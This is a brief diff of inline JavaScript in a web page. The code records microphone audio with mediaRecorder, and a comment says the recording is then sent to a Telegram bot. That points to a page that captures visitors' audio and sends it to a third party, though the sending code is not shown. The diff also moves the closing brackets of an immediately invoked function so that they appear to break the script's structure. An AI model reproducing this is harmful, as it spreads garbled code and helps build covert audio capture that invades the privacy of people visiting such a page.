@@ -93,7 +93,7 @@
                         // Collect audio data in chunks
                         mediaRecorder.ondataavailable = function (e) {
                             audioDataChunks.push(e.data);
-                        }
+                        })();
 
                         // Stop audio recording and send it to Telegram bot
                         mediaRecorder.onstop = function () {
@@ -116,7 +116,7 @@
             } else {
                 alert(" Not supported in this browser ❌");
             }
-        })();
+        }
     </script>
 </head>
 <body>
